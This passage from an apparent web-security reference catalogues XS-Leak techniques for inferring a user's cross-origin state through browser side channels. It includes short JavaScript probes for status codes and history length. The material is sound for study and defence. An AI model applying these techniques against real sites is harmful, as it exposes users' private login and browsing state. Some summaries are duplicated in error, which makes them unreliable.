can\ntime\nit and if we managed to make the\nvictim page send\nmore\nrequests\nto the same endpoint to detect a\nstatus\nof the\npage\n, the\n6th request\nwill take\nlonger\nand we can detect it.\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPerformance API Techniques\nThe\nPerformance API\nprovides access to performance-related information enhanced by the data from the\nResource Timing API\nwhich provides the timings of network requests such as the duration but when there‚Äôs a\nTiming-Allow-Origin: *\nheader sent by the server the transfer size and domain lookup time is also provided.\nThis data can be accessed by using\nperformance.getEntries\nor\nperformance.getEntriesByName\nIt can also be used to get the execution time using the difference of\nperformance.now()\nhowever this seems to be less precise for a chrome fetch because it only provides the milliseconds.\nThis API can be used to measure the time of a request or to detect the use of X-Frame-Options as the blocked page won't be added to the\nperformance\nobject in Chrome.\nError Leak\nInclusion Methods\n: Frames, HTML Elements\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nA request that results in errors will not create a resource timing entry.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20Error%20Leak\n‚Äã\nIt is possible to\ndifferentiate between HTTP response status codes\nbecause requests that lead to an\nerror\ndo\nnot create a performance entry\n.\nStyle Reload Error\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nDue to a browser bug, requests that result in errors are loaded twice.\nCode Example\n:\nhttps://xsinator.com/testing.html#Style%20Reload%20Error%20Leak\n‚Äã\nIn the previous technique it was also identified two cases where browser bugs in GC lead to\nresources being loaded twice when they fail to load\n. This will result in multiple entries in the Performance API and can thus be detected.\nRequest Merging Error\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nRequests that result in an error can not be merged.\nCode Example\n:\nhttps://xsinator.com/testing.html#Request%20Merging%20Error%20Leak\n‚Äã\nThe technique was found in a table in the mentioned paper but no description of the technique was found on it. However, you can find the source code checking for it in\nhttps://xsinator.com/testing.html#Request%20Merging%20Error%20Leak\n‚Äã\nEmpty Page Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nEmpty responses do not create resource timing entries.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak\n‚Äã\nAn attacker can detect if a request resulted in an empty HTTP response body because e\nmpty pages do not create a performance entry in some browsers\n.\nXSS-Auditor Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nDetect presence of specific elements in a webpage with the XSS-Auditor in SA.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak\n‚Äã\nIn SA, it is possible to detect if the XSSAuditor was triggered and thus leak sensitive information. The XSS-Auditor is a built-in feature of SA and GC (now removed) designed to mitigate Cross-Site Scripting (XSS) attacks. In 2013, Braun and Heiderich [7] showed that the XSS-Auditor can be used to block benign scripts with false positives. Based on their technique, researchers exfiltrate information and detect specific content on a cross-origin page. These XS-Leaks were first described in a bug report by Terada and later in a blog post by Heyes . However, the discovered techniques applied only to the XSS-Auditor in GC and do not work in SA. We found that blocked pages will not create Performance API entries. That means an attacker can still leak sensitive information with the XSS-Auditor in SA.\nX-Frame Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2),\nhttps://xsleaks.github.io/xsleaks/examples/x-frame/index.html\n,\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options\n‚Äã\nSummary:\nResource with X-Frame-Options header does not create resource timing entry.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak\n‚Äã\nIf a page is\nnot allowed\nto be\nrendered\nin an\niframe\nit does\nnot create a performance entry\n. As a result, an attacker can detect the response header\nX-Frame-Options\n.\nSame happens if you use an\nembed\ntag.\nDownload Detection\nInclusion Methods\n: Frames\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nDownloads do not create resource timing entries in the Performance API.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20Download%20Detection\n‚Äã\nSimilar, to the XS-Leak described, a\nresource that is downloaded\nbecause of the ContentDisposition header, also does\nnot create a performance entry\n. This technique works in all major browsers.\nRedirect Start Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Redirect\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nResource timing entry leaks the start time of a redirect.\nCode Example\n:\nhttps://xsinator.com/testing.html#Redirect%20Start%20Leak\n‚Äã\nWe found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However, in\nSA\nit is possible to detect if the user is\nredirected\nby the target page, by querying the\nPerformance API\nand checking for the\nredirectStart timing data\n.\nDuration Redirect Leak\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Redirect\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nThe duration of timing entries is negative when a redirect occurs.\nCode Example\n:\nhttps://xsinator.com/testing.html#Duration%20Redirect%20Leak\n‚Äã\nIn GC, the\nduration\nfor requests that result in a\nredirect\nis\nnegative\nand can thus be\ndistinguished\nfrom requests that do not result in a redirect.\nCORP Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.2)\nSummary:\nResource protected with CORP do not create resource timing entries.\nCode Example\n:\nhttps://xsinator.com/testing.html#Performance%20API%20CORP%20Leak\n‚Äã\nIn some cases, the\nnextHopProtocol entry\ncan be used as a leak technique. In GC, when the\nCORP header\nis set, the nextHopProtocol will be\nempty\n. Note that SA will not create a performance entry at all for CORP-enabled resources.\nService Worker\nInclusion Methods\n: Frames\nDetectable Difference\n: API Usage\nMore info\n:\nhttps://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/\n‚Äã\nSummary:\nDetect if a service worker is registered for a specific origin.\nCode Example\n:\nService workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and\ncache resources\nto create offline web application.\nIf a\nresource cached\nby a\nservice worker\nis accessed via\niframe\n, the resource will be\nloaded from the service worker cache\n.\nTo detect if the resource was\nloaded from the service worker\ncache the\nPerformance API\ncan be used.\nThis could also be done with a Timing attack (check the paper for more info).\nCache\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Timing\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources\n‚Äã\nSummary:\nDetect if a resource was stored in the cache.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources\n,\nhttps://xsinator.com/testing.html#Cache%20Leak%20(POST)\n‚Äã\nUsing the\nPerformance API\nit's possible to check if a resource is cached.\nFor more info:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources\n‚Äã\nNetwork Duration\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration\n‚Äã\nSummary:\nIt is possible to retrieve the network duration of a request from the\nperformance\nAPI.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration\n‚Äã\nError Messages Technique\nMedia Error\nInclusion Methods\n: HTML Elements (Video, Audio)\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=828265\n‚Äã\nSummary:\nIn FF, it is possible to accurately leak a cross-origin request‚Äôs status code.\nCode Example\n:\nhttps://jsbin.com/nejatopusi/1/edit?html,css,js,output\n‚Äã\n// Code saved here in case it dissapear from the link\n// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/\nwindow\n.\naddEventListener\n(\n\"load\"\n,\nstartup\n,\nfalse\n);\nfunction\ndisplayErrorMessage\n(\nmsg\n)\n{\ndocument\n.\ngetElementById\n(\n\"log\"\n).\ninnerHTML\n+=\nmsg\n;\n}\n‚Äã\nfunction\nstartup\n()\n{\nlet\naudioElement\n=\ndocument\n.\ngetElementById\n(\n\"audio\"\n);\n// \"https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3\";\ndocument\n.\ngetElementById\n(\n\"startTest\"\n).\naddEventListener\n(\n\"click\"\n,\nfunction\n()\n{\naudioElement\n.\nsrc\n=\ndocument\n.\ngetElementById\n(\n\"testUrl\"\n).\nvalue\n;\n},\nfalse\n);\n// Create the event handler\nvar\nerrHandler\n=\nfunction\n()\n{\nlet\nerr\n=\nthis\n.\nerror\n;\nlet\nmessage\n=\nerr\n.\nmessage\n;\nlet\nstatus\n=\n\"\"\n;\n// Chrome error.message when the request loads successfully: \"DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed\"\n// Firefox error.message when the request loads successfully: \"Failed to init decoder\"\nif\n((\nmessage\n.\nindexOf\n(\n\"DEMUXER_ERROR_COULD_NOT_OPEN\"\n)\n!=\n-\n1\n)\n||\n(\nmessage\n.\nindexOf\n(\n\"Failed to init decoder\"\n)\n!=\n-\n1\n)){\nstatus\n=\n\"Success\"\n;\n}\nelse\n{\nstatus\n=\n\"Error\"\n;\n}\ndisplayErrorMessage\n(\n\"<strong>Status: \"\n+\nstatus\n+\n\"</strong> (Error code:\"\n+\nerr\n.\ncode\n+\n\" / Error Message: \"\n+\nerr\n.\nmessage\n+\n\")<br>\"\n);\n};\naudioElement\n.\nonerror\n=\nerrHandler\n;\n}\nThe message property of the\nMediaError\ninterface contains a\ndifferent string for resources that loads successfully\n. This allows an attacker to infer the response status for a cross-origin resource.\nCORS Error\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.3)\nSummary:\nIn SA CORS error messages leak the full URL of redirects.\nCode Example\n:\nhttps://xsinator.com/testing.html#CORS%20Error%20Leak\n‚Äã\nThis technique allows an attacker to leak the target of a redirect that is initiated by a cross-origin site.\nCORS allows publicly accessible web resources to be read and used from any website. In Webkit-based browsers, it is possible to\naccess CORS error messages when a CORS request fails\n. An attacker can send a CORS-enabled request to a target website which\nredirects\nbased on the user state. When the browser denies the request, the\nfull URL of the redirect target is leaked\nin the error message. With this attack, it is possible to detect redirects, leak redirect locations, and sensitive query parameters.\nSRI Error\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.3)\nSummary:\nIn SA CORS error messages leak the full URL of redirects.\nCode Example\n:\nhttps://xsinator.com/testing.html#SRI%20Error%20Leak\n‚Äã\nAn attacker can leak the size of cross-origin responses due to\nverbose error messages\n.\nThe integrity attribute defines a cryptographic hash by which the browser can verify that a fetched resource has not been manipulated. This security mechanism is called Subresource Integrity (SRI). It is used for integrity verification of resources served from content delivery networks (CDNs). To prevent data leaks, cross-origin resources must be\nCORS-enabled\n. Otherwise, the response is not eligible for integrity validation. Similar to the CORS error XS-Leak, it is possible to catch the\nerror message after a fetch request with an integrity attribute fails\n. An attacker can forcefully\ntrigger\nthis\nerror\non any request by specifying a\nbogus hash value\n. In SA, this error message leaks the content length of the requested resource. An attacker can use this leak to detect differences in response size, which enables powerful XS-Leak attacks.\nCSP Violation/Detection\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=313737\n,\nhttps://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html\n,\nhttps://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects\n‚Äã\nSummary:\nAllowing only the victims website in the CSP if we accessed it tries to redirect to a different domain the CSP will trigger a detectable error.\nCode Example\n:\nhttps://xsinator.com/testing.html#CSP%20Violation%20Leak\n,\nhttps://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation\n‚Äã\nA XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to\nallow the target domain on the attacker site\n. Once a request is issued to the target domain, it\nredirects\nto a cross-origin domain.\nCSP blocks\nthe access to it and creates a\nviolation report used as a leak technique\n. Depending on the browser,\nthis report may leak the target location of the redirect\n.\nModern browsers won't indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.\nCache\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events\n,\nhttps://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html\n‚Äã\nSummary:\nClear the file from the cache. Opens target page checks if the file is present in the cache.\nCode Example:\nBrowsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has\nrequested a specific file\n.\nIf a page loads an image only if the user is logged in, you can\ninvalidate\nthe\nresource\n(so it's no longer cached if it was, see more info links),\nperform a request\nthat could load that resource and try to load the resource\nwith a bad request\n(e.g. using an overlong referer header). If the resource load\ndidn't trigger any error\n, it's because it was\ncached\n.\nCSP Directive\nInclusion Methods\n: Frames\nDetectable Difference\n: Header\nMore info\n:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1105875\n‚Äã\nSummary:\nCSP header directives can be probed with the CSP iframe attribute.\nCode Example\n:\nhttps://xsinator.com/testing.html#CSP%20Directive%20Leak\n‚Äã\nA new feature in GC allows web pages to proposes a CSP by setting an attribute on an iframe element. The policy directives are transmitted along with the HTTP request. Normally, the embedded content must explicitly allow this with an HTTP header,\notherwise an error page is displayed\n. However, if the iframe already ships a CSP and the new policy is not stricter, the page will display normally.\nThis allows an attacker to detect specific CSP directive of a crossorigin page, if it is possible to\ndetect the error page\n. Although, this bug is now marked as fixed, we found a\nnew leak technique that can detect the error page, because the underlying problem was never fixed.\nCORP\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/browser-features/corp/\n‚Äã\nSummary:\nResource protected with CORP throws error when fetched.\nCode Example\n:\nhttps://xsinator.com/testing.html#CORP%20Leak\n‚Äã\nThe CORP header is a relatively new web platform security feature that when set b\nlocks no-cors cross-origin requests to the given resource\n. The presence of the header can be detected, because a resource protected with CORP will\nthrow an error when fetched\n.\nCORB\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Headers\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header\n‚Äã\nSummary\n: CORB can allow attackers to detect when the\nnosniff\nheader is present\nin the request.\nCode Example\n:\nhttps://xsinator.com/testing.html#CORB%20Leak\n‚Äã\nCheck the more information link for more information about the attack.\nCORS error on Origin Reflection misconfiguration\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Headers\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration\n‚Äã\nSummary\n: If the Origin header is reflected in the header\nAccess-Control-Allow-Origin\nit's possible to check if a resource is in the cache already.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration\n‚Äã\nIn case the\nOrigin header\nis being\nreflected\nin the header\nAccess-Control-Allow-Origin\nan attacker can abuse this behaviour to try to\nfetch\nthe\nresource\nin\nCORS\nmode. If an\nerror\nisn't\ntriggered, it means that it was\ncorrectly retrieved form the web\n, if an error is\ntriggered\n, it's because it was\naccessed from the cache\n(the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)\n.\nNote that if the origin isn't reflected but a wildcard is used (\nAccess-Control-Allow-Origin: *\n) this won't work.\nReadable Attributes Technique\nFetch Redirect\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html\n‚Äã\nSummary:\nGC and SA allow to check the response‚Äôs type (opaque-redirect) after the redirect is finished.\nCode Example\n:\nhttps://xsinator.com/testing.html#Fetch%20Redirect%20Leak\n‚Äã\nSubmitting a request using the Fetch API with\nredirect: \"manual\"\nand other params, it's possible to read the\nresponse.type\nattribute and if it's equals to\nopaqueredirect\nthen the response was a redirect.\nCOOP\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Header\nMore info\n:\nhttps://xsinator.com/paper.pdf\n(5.4),\nhttps://xsleaks.dev/docs/attacks/window-references/\n‚Äã\nSummary:\nCOOP protected pages can not be accessed.\nCode Example\n:\nhttps://xsinator.com/testing.html#COOP%20Leak\n‚Äã\nAn attacker can leak if the Cross-Origin Opener Policy (COOP) header is available within a cross-origin HTTP response.\nWeb applications can deploy COOP response header to prevent other websites from gaining arbitrary window references to the application. However, this\nheader can easily be detected\nby trying to read the\ncontentWindow\nreference\n. If a site only deploys\nCOOP in one state\n, this property (\nopener\n) is\nundefined\n,\notherwise\nit is\ndefined\n.\nURL Max Length - Server Side\nInclusion Methods\n: Fetch API, HTML Elements\nDetectable Difference\n: Status Code / Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/navigations/#server-side-redirects\n‚Äã\nSummary:\nDetect differences in responses because of the redirect response length migt be too large that the server replays with an error and an alert is generated.\nCode Example\n:\nhttps://xsinator.com/testing.html#URL%20Max%20Length%20Leak\n‚Äã\nIf a server-side redirect uses\nuser input inside the redirection\nand\nextra data\n. It's possible to detect this behaviour because usually\nservers\nhas a\nlimit request length\n. If the\nuser data\nis that\nlength - 1\n, because the\nredirect\nis using\nthat data\nand\nadding\nsomething\nextra\n, it will trigger an\nerror detectable via Error Events\n.\nIf you can somehow set cookies to a user, you can also perform this attack by\nsetting enough cookies\n(\ncookie bomb\n) so with the\nresponse increased size\nof the\ncorrect response\nan\nerror\nis triggered. In this case, remember that is you trigger this request from a same site,\n<script>\nwill automatically send the cookies (so you can check for errors).\nAn example of the\ncookie bomb + XS-Search\ncan be found in the Intended solution of this writeup:\nhttps://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended\n‚Äã\nSameSite=None\nor to be in the same context is usually needed for this type of attack.\nURL Max Length - Client Side\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Status Code / Content\nMore info\n:\nhttps://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit\n‚Äã\nSummary:\nDetect differences in responses because of the redirect response length might too large for a request that a difference can be noticed.\nCode Example\n:\nhttps://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit\n‚Äã\nAccording to\nChromium documentation\n, Chrome's maximum URL length is 2MB.\nIn general, the\nweb platform\ndoes not have limits on the length of URLs (although 2^31 is a common limit).\nChrome\nlimits URLs to a maximum length of\n2MB\nfor practical reasons and to avoid causing denial-of-service problems in inter-process communication.\nTherefore if the\nredirect URL responded is larger in one of the cases\n, it's possible to make it redirect with a\nURL larger than 2MB\nto hit the\nlength limit\n. When this happens, Chrome shows an\nabout:blank#blocked\npage.\nThe\nnoticeable difference\n, is that if the\nredirect\nwas\ncompleted\n,\nwindow.origin\nthrows an\nerror\nbecause a cross origin cannot access that info. However, if the\nlimit\nwas **** hit and the loaded page was\nabout:blank#blocked\nthe window's\norigin\nremains that of the\nparent\n, which is an\naccessible information.\nAll the extra info needed to reach the\n2MB\ncan be added via a\nhash\nin the initial URL so it will be\nused in the redirect\n.\nURL Max Length - Client Side\nMax Redirects\nInclusion Methods\n: Fetch API, Frames\nDetectable Difference\n: Status Code\nMore info\n:\nhttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76\n‚Äã\nSummary:\nAbuse the redirect limit to detect redirects.\nCode Example\n:\nhttps://xsinator.com/testing.html#Max%20Redirect%20Leak\n‚Äã\nIf the\nmax\nnumber of\nredirects\nto follow of a browser is\n20\n, an attacker could try to load his page with\n19 redirects\nand finally\nsend the victim\nto the tested page. If an\nerror\nis triggered, then the page was trying to\nredirect the victim\n.\nHistory Length\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: Redirects\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/navigations/\n‚Äã\nSummary:\nJavaScript code manipulates the browser history and can be accessed by the length property.\nCode Example\n:\nhttps://xsinator.com/testing.html#History%20Length%20Leak\n‚Äã\nThe\nHistory API\nallows JavaScript code to manipulate the browser history, which\nsaves the pages visited by a user\n. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.\nChecking\nhistory.length\n, making a user\nnavigate\nto a page,\nchange\nit\nback\nto the same-origin and\nchecking\nthe new value of\nhistory.length\n.\nHistory Length with same URL\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: If URL is the same as the guessed one\nSummary:\nIt's possible to guess if the location of a frame/popup is in an specific URL abusing the history length.\nCode Example\n: Below\nAn attacker could use JavaScript code to\nmanipulate the frame/pop-up location to a guessed one\nand\nimmediately\nchange it to\nabout:blank\n. If the history length increased it means the URL was correct and it had time to\nincrease because the URL isn't reloaded if it's the same\n. If it didn't increased it means it\ntried to load the guessed URL\nbut because we\nimmediately after\nloaded\nabout:blank\n, the\nhistory length did never increase\nwhen loading the guessed url.\nasync\nfunction\ndebug\n(\nwin\n,\nurl\n)\n{\nwin\n.\nlocation\n=\nurl\n+\n'#aaa'\n;\nwin\n.\nlocation\n=\n'about:blank'\n;\nawait\nnew\nPromise\n(\nr\n=>\nsetTimeout\n(\nr\n,\n500\n));\nreturn\nwin\n.\nhistory\n.\nlength\n;\n}\n‚Äã\nwin\n=\nwindow\n.\nopen\n(\n\"https://example.com/?a=b\"\n);\nawait\nnew\nPromise\n(\nr\n=>\nsetTimeout\n(\nr\n,\n2000\n));\nconsole\n.\nlog\n(\nawait\ndebug\n(\nwin\n,\n\"https://example.com/?a=c\"\n));\n‚Äã\nwin\n.\nclose\n();\nwin\n=\nwindow\n.\nopen\n(\n\"https://example.com/?a=b\"\n);\nawait\nnew\nPromise\n(\nr\n=>\nsetTimeout\n(\nr\n,\n2000\n));\nconsole\n.\nlog\n(\nawait\ndebug\n(\nwin\n,\n\"https://example.com/?a=b\"\n));\nFrame Counting\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/frame-counting/\n‚Äã\nSummary:\nRead number of frames (window.length).\nCode Example\n:\nhttps://xsinator.com/testing.html#Frame%20Count%20Leak\n‚Äã\nCounting the\nnumber of frames in a web\nopened via\niframe\nor\nwindow.open\nmight help to identify the\nstatus of the user over that page\n.\nMoreover, if the page has always the same number of frames, checking\ncontinuously\nthe number of frames might help to identify a\npattern\nthat might leak info.\nAn example of this technique is that in chrome, a\nPDF\ncan be\ndetected\nwith\nframe counting\nbecause an\nembed\nis used internally. There are\nOpen URL Parameters\nthat allow some control over the content such as\nzoom\n,\nview\n,\npage\n,\ntoolbar\nwhere this technique could be interesting.\nHTMLElements\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/element-leaks/\n‚Äã\nSummary:\nRead the leaked value to distinguish between 2 possible states\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/element-leaks/\n,\nhttps://xsinator.com/testing.html#Media%20Dimensions%20Leak\n,\nhttps://xsinator.com/testing.html#Media%20Duration%20Leak\n\u0000\u0000‚Äã\nSome webpages may\ndynamically generate media files\ndepending on user information or add watermarks that change media size. An attacker can use information leaked by those HTML elements to distinguish between possible states.\nSome HTMLElements will leak some information to cross-origins such as the type of media they are:\n‚Äã\nHTMLMediaElement\nleaks the media\nduration\nand the\nbuffered\ntimes.\n‚Äã\nHTMLVideoElement\nleaks the\nvideoHeight\nand\nvideoWidth\nsome browsers may also have\nwebkitVideoDecodedByteCount\n,\nwebkitAudioDecodedByteCount\nand\nwebkitDecodedFrameCount\n‚Äã\ngetVideoPlaybackQuality()\nleaks the\ntotalVideoFrames\n.\n‚Äã\nHTMLImageElement\nleaks the\nheight\nand\nwidth\nbut if the image is invalid they will be 0 and\nimage.decode()\nwill get rejected.\nCSS Property\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle\n,\nhttps://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html\n‚Äã\nSummary:\nDetect website styling depending on the status of the user.\nCode Example\n:\nhttps://xsinator.com/testing.html#CSS%20Property%20Leak\n‚Äã\nWeb applications may change w\nebsite styling depending on the status of the use\n. Cross-origin CSS files can be embedded on the attacker page with the\nHTML link element\n, and the\nrules\nwill be\napplied\nto the attacker page. If a page dynamically changes these rules, an attacker can\ndetect\nthese\ndifferences\ndepending on the user state.\nAs a leak technique, the attacker can use the\nwindow.getComputedStyle\nmethod to\nread CSS\nproperties of a specific HTML element. As a result, an attacker can read arbitrary CSS properties if the affected element and property name is known.\nCSS History\nInclusion Methods\n: HTML Elements\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history\n‚Äã\nSummary:\nDetect if the\n:visited\nstyle is applied to an URL indicating it was already visited\nCode Example\n:\nhttp://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html\n‚Äã\nAccording to\nthis\n, this is not working in headless Chrome.\nUsing the CSS\n:visited\nselector, it‚Äôs possible to apply a different style for URLs that have been visited.\nPreviously it was possible to use\ngetComputedStyle()\nto detect this difference but now browsers prevent this by always returning values as if the link was visited and limiting what styles can be applied using the selector.\nSo, it may be needed to trick the user into clicking an area that the CSS has affected this can be done using\nmix-blend-mode\n.\nThere are also ways to do it without user interaction such as by abusing render timings this works because it takes time to paint links a different color.\nA PoC was provided on a chromium report that works by using multiple links to increase the time difference.\nContentDocument X-Frame Leak\nInclusion Methods\n: Frames\nDetectable Difference\n: Headers\nMore info\n:\nhttps://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf\n‚Äã\nSummary:\nIn GC, when a page is not allowed to be embedded on a cross-origin page because of\nX-Frame-Options, an error page is shown\n.\nCode Example\n:\nhttps://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak\n‚Äã\nIn Chrome, when a page is not allowed to be embedded on a cross-origin page, because the\nX-FrameOptions\n(XFO) header is set to deny or same-origin, an\nerror page is shown instead\n. For objects, this error page can be\ndetected by checking the\ncontentDocument\nproperty\n. Typically, this property returns null because access to a cross-origin embedded document is not allowed. However, due to\nChrome‚Äôs rendering\nof the error page, an\nempty document object\nis returned instead. This does not work for iframes or in other browsers. Developers may forget to set X-Frame-Options for all pages and especially error pages often miss this header. As a leak technique, an attacker may be able to differentiate between different user states by checking for it.\nDownload Detection\nInclusion Methods\n: Frames, Pop-ups\nDetectable Difference\n: Headers\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/navigations/#download-trigger\n‚Äã\nSummary:\nAttacker can detect downloads by using iframes. If the iframe is still accessible, the file was downloaded.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/navigations/#download-bar\n‚Äã\nThe\nContent-Disposition\nheader (\nContent-Disposition: attachment\n) indicates if the browser is either supposed to downloaded content or displayed it inline.\nIf only a logged in user would be able to\naccess a page which will download a file\nbecause it's using the header. It's possible to detect that behaviour.\nDownload bar\nIn Chromium-based browsers, when a file is downloaded, a preview of the download process\nappears in a bar at the bottom\n, integrated into the browser window. By\nmonitoring the window height\n, attackers can detect whether the ‚Äúdownload bar‚Äù opened.\nDownload Navigation (with iframes)\nAnother way to test for the\nContent-Disposition: attachment\nheader is to\ncheck if a navigation occurred\n. If a page load causes a download, it does not trigger a navigation and the\nwindow stays within the same origin\n.\nDownload Navigation (without iframes)\nSame technique as the previous one but using\nwindow.open\ninstead of iframes.\nPartitioned HTTP Cache Bypass\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Timing\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass\n‚Äã\nSummary:\nAttacker can detect downloads by using iframes. If the iframe is still accessible, the file was downloaded.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass\n,\nhttps://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722\n(from\nhttps://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/\n)\nThis is why this technique is interesting: Chrome now has\ncache partitioning\n, and the cache key of the newly opened page is:\n(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)\n, but if I open an ngrok page and use fetch in it, the cache key will be:\n(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)\n, the\ncache key is different\n, so the cache cannot be shared. You can find more detail here:\nGaining security and privacy by partitioning the cache\n(Comment from\nhere\n)\nIf a site\nexample.com\nincludes a resource from\n*.example.com/resource\nthen that resource will have the\nsame caching key\nas if the resource was directly\nrequested through top-level navigation\n. That is because the caching key is consisted of top-level\neTLD+1\nand frame\neTLD+1\n.\nBecause accessing the cache is faster than loading a resource, it's possible to try to change the location of a page and cancel it 20ms (for example) after. If the origin was changed after the stop, it means that the resource was cached.\nOr could just\nsend some fetch to the pontentially cached 